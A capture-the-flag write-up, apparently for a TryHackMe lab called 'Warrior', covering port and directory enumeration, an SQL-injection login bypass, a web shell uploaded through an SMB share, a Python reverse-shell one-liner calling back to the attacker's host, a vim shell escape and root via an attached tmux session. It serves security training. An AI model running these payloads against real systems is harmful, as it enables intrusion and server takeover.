![image](https://user-images.githubusercontent.com/87468669/201511965-83a72cc1-a22f-44a1-a9e8-98ba23a74458.png)

First we start with an nmap scan

```nmap -sC -sV -T4 -oN nmap.txt <IP>```

```
# Nmap 7.93 scan initiated Sun Nov 13 07:28:59 2022 as: nmap -sC -sV -T4 -oN quicknmap.txt -Pn 10.10.37.149
Nmap scan report for 10.10.37.149
Host is up (0.18s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
8080/tcp open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8082/tcp open  http        Node.js Express framework
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: Host: INCOGNITO

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: incognito
|   NetBIOS computer name: INCOGNITO\x00
|   Domain name: \x00
|   FQDN: incognito
|_  System time: 2022-11-13T06:29:35+00:00
| smb2-time: 
|   date: 2022-11-13T06:29:36
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: INCOGNITO, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 13 07:29:42 2022 -- 1 IP address (1 host up) scanned in 43.55 seconds
```

great we have http 8080, 8082 and smb 139,445 services open. Let's enumerate http first port 8080

![image](https://user-images.githubusercontent.com/87468669/201512516-f28f9eb5-1b1e-490d-ba6e-6ba65d39ac07.png)

let's burst hidden directory 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ ffuf -u "http://10.10.37.149:8080/FUZZ" -w /usr/share/dirb/wordlists/common.txt -fc 403 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.37.149:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 190ms]
dev                     [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 196ms]
index.php               [Status: 200, Size: 4, Words: 1, Lines: 1, Duration: 181ms]
index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 183ms]
:: Progress: [4614/4614] :: Job [1/1] :: 72 req/sec :: Duration: [0:00:53] :: Errors: 0 ::

```

let's check the /dev directory 

![image](https://user-images.githubusercontent.com/87468669/201512701-fab96f7c-205d-459b-9f67-c9c7dbe8514c.png)

we are forbidden to access the /dev directory, let's fuzz further 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ ffuf -u "http://10.10.37.149:8080/dev/FUZZ" -w /usr/share/dirb/wordlists/common.txt -fc 403 -e .txt,.php,.bak

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.37.149:8080/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Extensions       : .txt .php .bak 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

note.txt                [Status: 200, Size: 45, Words: 6, Lines: 2, Duration: 163ms]
:: Progress: [18456/18456] :: Job [1/1] :: 23 req/sec :: Duration: [0:02:50] :: Errors: 0 ::
```

got a note.txt, let's check it out 

![image](https://user-images.githubusercontent.com/87468669/201512991-ff53ee25-a624-409f-8f3f-ff3234559d4c.png)

let's check the other http port 8082

![image](https://user-images.githubusercontent.com/87468669/201513357-ed159d2f-9448-49ce-aa2b-a375a95d29ab.png)

Let's burst hidden directory

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ ffuf -u "http://10.10.37.149:8082/FUZZ" -w /usr/share/wordlists/dirb/common.txt -fc 403 -e .txt,.bak,.php 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.37.149:8082/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .txt .bak .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 11162, Words: 2014, Lines: 126, Duration: 165ms]
login                   [Status: 200, Size: 1605, Words: 352, Lines: 29, Duration: 181ms]
Login                   [Status: 200, Size: 1605, Words: 352, Lines: 29, Duration: 215ms]
static                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 163ms]
:: Progress: [18456/18456] :: Job [1/1] :: 223 req/sec :: Duration: [0:03:18] :: Errors: 0 ::
```

let's check out the /login directory

![image](https://user-images.githubusercontent.com/87468669/201513607-10edca58-3805-49ca-b7f2-b5bca4e187d9.png)

we have a login page, let's try bypass the login page using payload `admin"or 1=1 or ""="` was able to bypass the login page 

![image](https://user-images.githubusercontent.com/87468669/201513678-9f2e69d9-6f5e-4ad7-8825-f0286d940b59.png)

we logged in and we got some creds... Let's enumerate smb services 

![image](https://user-images.githubusercontent.com/87468669/201513733-9efa0040-b8ca-437d-af2f-d13ea12e0729.png)

we have a share name SECURED, let's try login with the creds we found earlier 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ smbclient  //10.10.37.149/SECURED -U ArthurMorgan
Password for [WORKGROUP\ArthurMorgan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov 13 09:55:21 2022
  ..                                  D        0  Thu Mar 11 13:52:29 2021
  note.txt                            A       45  Thu Mar 11 13:19:52 2021

                7743660 blocks of size 1024. 4474300 blocks available

```

we can see the note.txt file there, it is the same content found in /dev directory in the web service. let's try upload a shell in the smb server 

![image](https://user-images.githubusercontent.com/87468669/201513973-440208f4-3671-4d3c-9a1b-b1a6c690670d.png)

we can upload a rce shell in the smb share, let's check it in the /dev directory on the web service 

![image](https://user-images.githubusercontent.com/87468669/201514044-2a71425c-572f-4cbb-a854-4a2d6238a778.png)

we got an rce, let's get a reverse shell. 
reverse shell payload ready 

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.0.73",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

ncat listener ready

![image](https://user-images.githubusercontent.com/87468669/201514114-e0499ee1-3ea9-4eaf-a4e7-82db228d89eb.png)

send the payload 

![image](https://user-images.githubusercontent.com/87468669/201514138-1f9e112e-20f9-43ab-99af-0d94c7cd93e7.png)

check our ncat listener we got a shell

![image](https://user-images.githubusercontent.com/87468669/201514161-04c01c58-5e70-421a-b507-9426bc2f7eb8.png)

now let's stabilize the shell

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.8.0.73] from (UNKNOWN) [10.10.37.149] 45542
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@incognito:/var/www/html/dev$ ^Z
zsh: suspended  nc -lnvp 1337
                                                                                                                                                                       
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/Warrior]
└─$ stty raw -echo;fg                              
[1]  + continued  nc -lnvp 1337
                               export TERM=xterm
www-data@incognito:/var/www/html/dev$ stty rows 40 cols 160
www-data@incognito:/var/www/html/dev$ 

```

we got a stable shell, let's escalate privs... first switch user to ArthurMorgan from www-data

![image](https://user-images.githubusercontent.com/87468669/201514313-12c50506-5cd5-4374-be29-31e5f3b3c79d.png)

let's run linpeas

![image](https://user-images.githubusercontent.com/87468669/201514544-a372b796-7f5c-4591-a906-4bfa0db10ab1.png)

we can see the active ports... let's use ncat to check what runs on the port 4545 

![image](https://user-images.githubusercontent.com/87468669/201515023-7dec0e8c-55cc-45ef-81b2-be77a6023f56.png)

It gaves us options to choose, after trying all the options, figured option 4 opens a vim editor, let's try exploit vim to gain shell...

```
vim payload
:set shell=/bin.bash
:shell
```

![image](https://user-images.githubusercontent.com/87468669/201515241-49da8154-a7b9-4b10-938d-289502689b4f.png)

let's stabilize the shell

![image](https://user-images.githubusercontent.com/87468669/201515917-b700b680-86be-4d45-870d-662eedc1b0cf.png)

now let's escalate privs to root... running linpeas again 

![image](https://user-images.githubusercontent.com/87468669/201515956-24b5f363-b4da-40dc-a29b-57be7cde4667.png)

we can see tmux session is running, let's check the tmux sessions available 

![image](https://user-images.githubusercontent.com/87468669/201516060-91aa58e4-63bd-4f73-86f9-bba053e68311.png)

let's attach shell to the tmux session... using command `tmux attach-session -t 0` we get a root shell 

![image](https://user-images.githubusercontent.com/87468669/201516254-5b581226-09d8-41c6-8245-706a290c9fa3.png)

And we are done. Hope you had fun 😉
